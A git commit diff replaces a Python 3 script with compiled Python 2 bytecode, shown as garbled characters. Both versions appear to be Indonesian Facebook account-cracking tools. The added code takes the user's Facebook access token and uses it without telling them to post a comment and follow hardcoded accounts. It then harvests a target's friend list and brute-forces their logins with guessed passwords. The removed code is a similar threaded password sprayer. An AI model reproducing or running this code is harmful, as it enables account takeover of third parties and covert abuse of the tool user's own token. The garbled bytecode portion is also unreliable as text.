08bc9feb18c9e5cbd1bb5f0bb09386f5efb24f76
Mantalstudio <75010285+Mantalstudio@users.noreply.github.com>
2022-01-24 14:01:20 +0500

    Update test111.py

--- test111.py
+++ test111.py
@@ -1,66 +1,139 @@
+ó
+ëà‡ac           @   s  d  d l  Z  d  d l Z d  d l Z d  d l Z y( d  d l Z d  d l Z d  d l Z Wn e k
+ ru d GHd GHn Xy4 d  d l m	 Z	 d  d l
+ m
+ Z
+ d  d l m Z Wn e	 k
+ rÂ d GHn Xd a
+ g  Z g  Z d	 Z d
+ Z d Z d Z d
+ Z d Z d Z d Z y e j d ƒ j Z Wn# e	 k
+ r@d GHe j d ƒ n Xd Z d „  Z d Z d „  Z d „  Z  d „  Z! d „  Z" d „  Z# e$ d k r™e ƒ  n  d S(   iÿÿÿÿNs&    [-] module requests belum terinstall s+    [-] silahkan ketik > pip2 install requests(   t   ConnectionError(   t   datetime(   t
+   ThreadPools$    [-] check your internet Connection i    s   [1;93ms   [1;92ms   [1;101ms   [0ms   [1;91ms   [1;96msz   NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420t
+   rafianonyms   https://api.ipify.orgs'   
+ [!] check your internet Connection !
+i   s3   __________________________________________________
+c         C   sC   x< |  d D]0 } t  j j | ƒ t  j j ƒ  t j d ƒ q Wd  S(   Ns   
+gš™™™™™¹?(   t   syst   stdoutt   writet   flusht   timet   sleep(   t   zt   i(    (    s   /sdcard/bfr.pyt   jalan1   s    
+s_  
+[1;96m         _______  ______  
+([1;96m    @ (_______)(_____ \ 	[0m[ [1;91mMantalstudio[0m ]
+ [1;96m)    @ _____    _____) )
+[1;96m|      |  ___)  |  __  / 
+[1;96m|      | |      | |  \ \ 
+[1;96m|_____ |_|      |_|   |_|
+[1;101m[1;97mCreat by : Mantalstudio =>   2022[0m
+__________________________________________________
+c          C   s×   t  j d ƒ y t d d ƒ }  t ƒ  Wn© t t f k
+ rÒ t GHd GHd GHt d ƒ } | d k r€ d GHt j	 d	 ƒ t
+ ƒ  qÓ | d
+ k s˜ | d k r¢ t ƒ  qÓ | d k rÈ t d
+ ƒ t  j d ƒ qÓ t
+ ƒ  n Xd  S(   Nt   clears   login_r.txtt   rs    [1] login with token facebook s    [0] exit 
+s    [[101m[1;97m?[0m] pilih : t    s   
+ [!] mohon di isi i   t   1t   01t   0s    [R] silahkan kembali lagi t   exit(
+   t   ost   systemt   opent   menut   KeyErrort   IOErrort	   rafi_logot	   raw_inputR   R	   t   logint   tokenzR   (   t   tokent   met_log(    (    s   /sdcard/bfr.pyR   B   s&    
+ 
+
+
+
+c          C   sÈ   t  j d ƒ t GHy t d d ƒ }  Wnœ t t f k
+ rÃ t d ƒ }  y` t j d |  ƒ } t	 j
+ | j ƒ } t d d ƒ } | j |  ƒ | j
+ ƒ  t ƒ  t d ƒ WqÄ t k
+ r¿ d GHqÄ Xn Xd  S(	   NR
+   s   login_r.txtR   s    [[101m?[0m] token : s+   https://graph.facebook.com/me?access_token=t   ws    [!] login succes....s    [!] token salah (   R   R   R   R   R   R   R   t   requestst   gett   jsont   loadst   textR   t   closet   follow_my_accountR   (   R   t   otwt   at   avsid(    (    s   /sdcard/bfr.pyR   W   s     
+
+
+
+c          C   s•   y t  d d ƒ j ƒ  }  Wn- t k
+ rH d GHt d ƒ t j d ƒ n Xd } t j d | d |  ƒ t j d	 |  ƒ t j d
+ |  ƒ t ƒ  d  S(   Ns   login_r.txtR   s    invalid token ! s    please login agains   rm -rf login_r.txts   lopyu bang rafis=   https://graph.facebook.com/148068940881574/comments/?message=s   &access_token=sD   https://graph.facebook.com/100070354054405/subscribers?access_token=sD   https://graph.facebook.com/100067770738028/subscribers?access_token=(	   R   t   readR   R   R   R   R!   t   postR   (   R   t   kom_r(    (    s   /sdcard/bfr.pyR'   i   s    
+
+c          C   s?  t  j d ƒ y t d d ƒ j ƒ  a Wn< t k
+ rd t d ƒ t  j d ƒ t  j d ƒ t ƒ  n Xy= t j	 d t ƒ }  t
+ j |  j ƒ } | d } | d } WnW t
+ k
+ rà t  j d ƒ t d	 ƒ t  j d ƒ t ƒ  n t j j k
+ rû d
+ GHn Xt GHd t t | f GHd t t t f GHd
+ t t | f GHd t t f GHd t t f GHd t t f GHt d ƒ } | d k sˆ| d k r’t ƒ  n© | d k sª| d k rØt d ƒ t j d ƒ t  j d ƒ t ƒ  nc | d k rþt d ƒ t  j d ƒ n= | d k s| d k r*t d ƒ t ƒ  n t d ƒ t ƒ  d  S(   NR
+   s   login_r.txtR   s    [!] token invalid s   rm -rf login_r.txts,   https://graph.facebook.com/me/?access_token=t   namet   ids    [!] invalid token s$    [!] check your Internet connection s    [%s-%s] facebook user : %ss    [%s-%s] ip user : %ss    [%s-%s] id user : %s
+s    [%s1%s] start crack s    [%s2%s] hapus token s    [%s0%s] logout
+ s
+    [?] pilih : R   R   t   2t   02s    [!] menghapus token....i   R   s    [!] silahkan datang kembali R   R   t    s    [!] harap di isi s"    [!] hanya pilih yang ada di menu (   R   R   R   R+   R   R   R   R   R!   R"   R#   R$   R%   R   t
+   exceptionsR    R   t   mlt   rat   ipt   hjt   kut   mR   t   crackR   R	   R   (   R(   R)   t   namaR/   t   asw(    (    s   /sdcard/bfr.pyR   v   sV    
+
+
+
+
+
+
+
+
+
+
+	
+
+ 
+
+
+
+
+
+
+c    
+      C   sh  t  j d ƒ t GHy t d d ƒ j ƒ  a Wn t k
+ rJ d GHt ƒ  n Xt d ƒ }  y1 t	 j
+ d |  d t ƒ } t j | j
+ ƒ } Wn t k
+ r¥ t d ƒ n Xt	 j
+ d |  d	 t ƒ } t j | j
+ ƒ } x; | d
+ D]/ } | d } | d } t j | d
+ | ƒ qÞ Wd t t t ƒ ƒ GHt GHd GHt GHd „  } t d ƒ }	 |	 j | t ƒ t d ƒ d  S(   NR
+   s   login_r.txtR   s    [!] invalid token s"    [[101m[1;97m?[0m] ID Public : s   https://graph.facebook.com/s   ?access_token=s    [!] Id tidak ditemukan s   /friends?access_token=t   dataR/   R.   s   <=>s"    [[101m[1;97m-[0m] Total ID  : s'    		[1;101m[1;97mCTRL + Z FOR STOP[0mc      	   S   s×  g  } t  j j d t t t t ƒ f ƒ t  j j ƒ  y t j	 d ƒ Wn t
+ k
+ rZ n X|  j d ƒ \ } } x| j d ƒ D]ó } t | ƒ d k  rž q€ q€ t | ƒ d k ræ t | ƒ d k ræ t | ƒ d k ræ t | ƒ d k sø t | ƒ d	 k rL| j | ƒ | j | d
+ ƒ | j | d ƒ | j | d ƒ | j | d
+ ƒ q€ | j d ƒ | j d ƒ | j d ƒ q€ WyRxA| D]9} | j
+ ƒ  } t j d d i | d 6| d 6d d 6d i t d 6ƒ} | j } d | k sëd | k rUd | d | d d f GHt j | d | ƒ t j d t | ƒ d t | ƒ d  ƒ t j ƒ  Pqn  d! | k ryÏ t d" ƒ j ƒ  a d# | d$ t } t j | ƒ j ƒ  }	 |	 d% j d& d' ƒ }
+ |	 d( } d) | d* | d* |
+ GHt j | d* | d* |
+ ƒ t j d+ t | ƒ d* t | ƒ d* |
+ d  ƒ t j ƒ  PWn# t t f k
+ rOd }
+ n n Xd, | d* | d GHt j | d | ƒ t j d+ t | ƒ d* t | ƒ d  ƒ t j ƒ  PqqqWt d 7a Wn n Xd  S(-   Ns)   
+ [%sC] berjalan %s - %s please wait.. ! t   resultss   <=>R2   i   i   i   i   i   t   12t   123t   1234t   12345t   sayangt   kontolt	   bismillahs%   https://mbasic.facebook.com/login.phpR=   t   emailt   passt   submitR   t   headerss
+   user-agentt   mbasic_logout_buttons   save-devices   
+  ==-[ t   |s          s   ]-==s	     [ OK ] s   
+t
+   checkpoints   login_r.txts   https://graph.facebook.com/s   ?access_token=t   birthdayt   /t   -R.   s   
+  [1;96m[ CP ] s    <-> s	     [ CP ] s   
+  [1;96m [ CP ] (    R   R   R   R5   t   loopt   lenR/   R   R   t   mkdirt   OSErrort   splitt   appendt   lowerR!   R,   t   uat   contentt   okt   savet   strR&   R   R+   R   t   sR"   R#   t   replacet   cpR   R   (   t   usert   ra_pwt   rax_xR.   t   sst   pwt   rext   xot   urlR=   t   tgllhrR;   (    (    s   /sdcard/bfr.pyt   main¾   st    	
+ 
+ Z
+
+
+
+7	)
+
+1
+	 )
+
+i   s    
+[!] selesai (   R   R   R   R   R+   R   R   R   R   R!   R"   R#   R$   R%   R   R   R/   RU   R[   RQ   t   garisR   t   mapR   (
+   t   ra_idt   pokt   spR   R
+   R   Ra   R.   Rh   t   p(    (    s   /sdcard/bfr.pyR:   ¤   s6    
+
+
+
+
+	<t   __main__(%   R   R   t   randomR   t   reR#   R!   t   ImportErrort   requests.exceptionsR    R   t   multiprocessing.poolR   RP   R/   R`   R8   R7   R4   R5   R9   t   bmRW   t   pw_rafiR"   R%   R6   R	   Ri   R   R   R   R   R'   R   R:   t   __name__(    (    (    s   /sdcard/bfr.pyt   <module>   sT   
+	
+	
+ 				
+	.	Z
 
-                   print('\n\x1b[1;96m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
-                   print('\x1b[1;95m     疊╔═╦═────••♽••─────═╦═╗疊')
-                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")       
-                   expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
-                   expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password2 \033[1;91m: \033[1;92m")
-                   expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password3 \033[1;91m: \033[1;92m")
-                   aahh('\x1b[1;94m────────────────────────────────────────────────────\n')
-                   ikeh_ikeh_kimochi()
-                   jembut()
-                   print('\n\x1b[1;92m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
-                   print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦═╗疊')
-                   print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")
-                   print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1b[1;97m] the result\x1b[1;93m CP\x1b[1;97m saved to : cp.txt')
-                   print('\n [\x1b[1;91m!\x1b[1;97m] turn off data to stop the process\n')
-                   with ThreadPoolExecutor(max_workers=30) as ex:
-                          for user in username:
-                                  users = user.split('|')
-                                  ss = users[0].split(' ')
-                                  for x in ss:
-                                          listpass = [
-                                                  str(x) + '123',
-                                                  str(x) + '1234',
-                                                  str(x) + '12345',
-                                                  str(x) + '123456',
-                                                  ]
-                                          listpass.append(expass)
-                                          for passw in set(listpass):
-                                                  ex.submit(login,(users[1]),(passw))
-                   if check != 0 or result != 0:
-                           time.sleep(0.1)
-                           print("\n\n\x1b[1;92m  *\x1b[1;97m finished.")
-     
-                   else:
-                           print("\n\n\x1b[1;96m  *\x1b[1;97m you got no results:(")
-               except (KeyboardInterrupt,EOFError):
-                       exit()
-               except requests.exceptions.ConnectionError:
-                       exit("\n\n\033[00m  [\033[91m!\033[00m] no Connection")
 
-    elif yayan == "2" or yayan =="02":
-         os.system("xdg-open https://youtu.be/72zvkSbVPOI") 
-         yayanxd()
-    elif yayan == "3" or yayan =="03":
-         os.system('xdg-open https://www.facebook.com/groups/1592269051080491')
-         yayanxd()
-    elif yayan == "4" or yayan =="04":
-         os.system('xdg-open https://www.facebook.com/groups/3877586212335618')
-         yayanxd()
-    elif yayan == "5" or yayan =="05":
-         print("\n\n\x1b[1;97m      [ \x1b[1;92mPlease Wait While Updating The Tools \x1b[1;97m]\n")
-         os.system("git pull")
-         print("\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Successfully Updated!\n ")
-         yayanxd()
-    elif yayan == "0" or yayan =="00":
-         aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
-         os.system('xdg-open https://youtube.com/channel/xxxxx-mg')
-         exit()                   	
-
-if __name__=="__main__":
-     ikeh_ikeh_kimochi()
-     croot()
-     ikeh_ikeh_kimochi()
-     kontol()
-     moch_yayan()
-     yayanxd()
+	MY NAME RAFI KHALBI !
